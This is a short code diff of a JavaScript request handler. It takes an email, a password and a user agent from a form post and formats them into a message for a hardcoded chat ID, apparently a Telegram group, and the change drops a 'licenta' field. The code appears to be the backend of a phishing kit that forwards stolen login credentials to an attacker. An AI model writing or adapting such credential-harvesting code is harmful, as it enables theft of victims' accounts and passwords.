@@ -8,14 +8,13 @@ module.exports = async function handler(req, res) {
   const chatId = '-5050388811';
 
   try {
-    const { email, pass, licenta, agent } = req.body;
+    const { email, pass, agent } = req.body;
 
     const message = `
 📩  habitat
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
-licenta: ${licenta}
 🖥️ Agent: ${agent}
     `;
 
